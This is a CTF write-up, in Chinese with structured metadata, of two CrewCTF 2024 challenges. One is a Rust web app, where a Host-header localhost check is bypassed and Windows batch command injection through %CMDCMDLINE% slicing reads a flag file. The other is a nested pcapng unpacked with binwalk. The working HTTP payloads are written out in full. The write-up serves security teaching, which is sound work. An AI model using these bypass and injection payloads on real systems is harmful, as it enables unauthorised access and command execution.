---
title: CrewCTF 2024 Writeup
contest: CrewCTF 2024
year: 2024
difficulty: medium
vuln_type: rce
tags:
- web
- rust
- host-header-bypass
- cmd-injection
- ping2
- binwalk
- 4层pcapng
attack_chain:
- middleware_localhost检查host以127.0.0.1开头可绕过
- 'GET /ai/run?cmd=env&arg= 主机头Host: 127.0.0.1'
- ping2 arg过滤 ' " * ! @ ^ ? 但允许%CMDCMDLINE%环境变量
- '%CMDCMDLINE%:~-1%&type.exe flag.txt 命令注入读flag'
- 4层pcapng+binwalk递归解压得flag
key_payload: GET /ai/run?cmd=ping2&arg=%25CMDCMDLINE%3a~-1%25%26type.exe%20flag.txt HTTP/1.1
one_liner: CrewCTF 2024 2题：Rust Host头绕过+ping2 bat命令注入，4层pcapng
lesson: '%CMDCMDLINE%环境变量+Windows批处理可绕字符过滤'
quality: medium
full_path: CrewCTF_2024_Writeup.full.md
meta_path: CrewCTF_2024_Writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'CrewCTF 2024 Writeup。CrewCTF 2024 2题：Rust Host头绕过+ping2 bat命令注入，4层pcapng。关键路径：middleware_localhost检查host以127.0.0.1开头可绕过 → GET /ai/run?cmd=env&arg= 主机头Host: 127.0.0.1 → ping2 arg过滤 '' " * ! @ ^ ? 但允...'
category: web
subcategory: rce
tools_used:
- Rust
- binwalk
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/197698.html
reasoning_chain:
- middleware_localhost 检查 req.uri().host().or(req.header('host')) 是否 starts_with('127.0.0.1') → 触发点：Rust Web 框架 Host 头绕过
- '假设：构造 Host: 127.0.0.1 即可绕过中间件访问内部端点 → 动作：GET /ai/run?cmd=env&arg= HTTP/1.1 + Host: 127.0.0.1'
- 观察：响应返回 cargo path 等环境变量 → 下一步：试 cmd=ping2（题目给的工具）
- ping2 函数过滤 '\'', '"', '*', '!', '@', '^', '?' → 但允许任意其他字符 + 调 ping.bat → 假设：可用 Windows 批处理环境变量
- 动作：构造 arg=%CMDCMDLINE:~-1%&type.exe flag.txt → CMDCMDLINE 是 cmd.exe 完整命令行，可用 :-1 取最后一个字符（双引号）
- 观察：批处理拼接 → '&type.exe flag.txt' → cmd.exe 把双引号当字符串边界执行 type.exe flag.txt
- 假设：4 层嵌套 pcapng → 动作：binwalk -e usb.pcapng → gzip→7z→tar→zip→pcapng 逐层解压
- 动作：dd ibs=1 obs=1 skip=14095 if=layer4.pcapng of=out.7z → binwalk -e layer3/2/1 → strings layer1.pcapng | grep crew
failed_attempts:
- '试图用 Host: localhost → 失败：starts_with(''127.0.0.1'') 严格匹配'
- 试图直接 'cmd /c type flag.txt' → 失败：'c' 单独不在过滤但 'type.exe flag.txt' 中空格不在过滤，但 Windows cmd 需 & 触发
- 试图用 ping2 arg=127.0.0.1 → 失败：纯 ICMP 不能读文件
key_observations:
- 'Rust Web 框架 Host 头检查若用 starts_with(''127.0.0.1'')，可直接设 Host: 127.0.0.1 绕过'
- Windows 批处理 %CMDCMDLINE:~-1% 环境变量切片是绕字符过滤经典手法
- 4 层嵌套压缩（gzip→7z→tar→zip→pcapng）binwalk + dd skip 组合可逐层剥开
- cmd.exe '&' 是命令分隔符，比 ';' '|' 更稳，能跨单引号双引号触发
prerequisites:
- Rust HTTP 框架（axum/actix-web）Host 头处理
- Windows 批处理环境变量（%CMDCMDLINE% / %~1）
- binwalk 递归解压（-e 自动检测 + dd ibs=1 obs=1 跳过偏移）
- pcapng 文件结构（pcap/pcapng magic 0x0a0d0d0a）
---
# CrewCTF 2024 Writeup

> 原文: https://www.ctfiot.com/197698.html
> ID: 197698


```
async fn middleware_localhost<E: Endpoint>(next: E, req: Request) -> Result<Response> {
 // No authentication? -T // "I [too] like to live dangerously." -V
 if let Some(host) = req.uri().host().or(req.header("host")) {
 if !host.trim_start().starts_with("127.0.0.1") {
 return Err(Error::
from_status(StatusCode::
UNAUTHORIZED));
 }
 } else {
 return Err(Error::
from_status(StatusCode::
UNAUTHORIZED));
 }

 let resp = next.call(req).await?.into_response();
 Ok(resp)
}
GET /ai/run?cmd=env&arg= HTTP/1.1
Host: 127.0.0.1

→

…
CARGO: \\?\C:\Users\ctf\.rustup\toolchains\1.76-x86_64-pc-windows-msvc\bin\cargo.exe
…
"ping2" => {
 if arg.contains(['\'', '"', '*', '!', '@', '^', '?']) {
 return Err("bad chars found".to_string());
 }
 let routput = Command::
new(".\\scripts\\ping.bat")
 .arg(arg)
 .output();

 if let Err(_e) = routput {
 return Err("failed to run ping2 output".to_string());
 }

 Ok(String::
from_utf8_lossy(&routput.unwrap().stdout).to_string())
}
GET /ai/run?cmd=ping2&arg=%25CMDCMDLINE%3a~-1%25%26type.exe%20flag.txt HTTP/1.1
Host: 127.0.0.1

→

HTTP/1.1 200 OK
…

Network checking finished!
crew{■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■}
$ binwalk -e usb.pcapng

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
13811 0x35F3 gzip compressed data, maximum compression, has original file name: "layer4.pcapng", from FAT filesystem (MS-DOS, OS/2, NT), last modified: 2024-04-06 09:43:23
$ binwalk -e layer4.pcapng

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
14095 0x370F 7-zip archive data, version 0.4

$ dd ibs=1 obs=1 skip=14095 if=layer4.pcapng of=out.7z
$ binwalk -e layer3.pcapng

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
13527 0x34D7 POSIX tar archive (GNU), owner user name: "capng"

$ binwalk -e layer2.pcapng

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
22811 0x591B Zip archive data, at least v2.0 to extract, compressed size: 3048, uncompressed size: 54768, name: layer1.pcapng
25961 0x6569 End of Zip archive, footer length: 22

$ binwalk -e layer1.pcapng

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------

$ strings layer1.pcapng | grep crew
crew{■■■■■■■■■■■■■■■■■■}
```
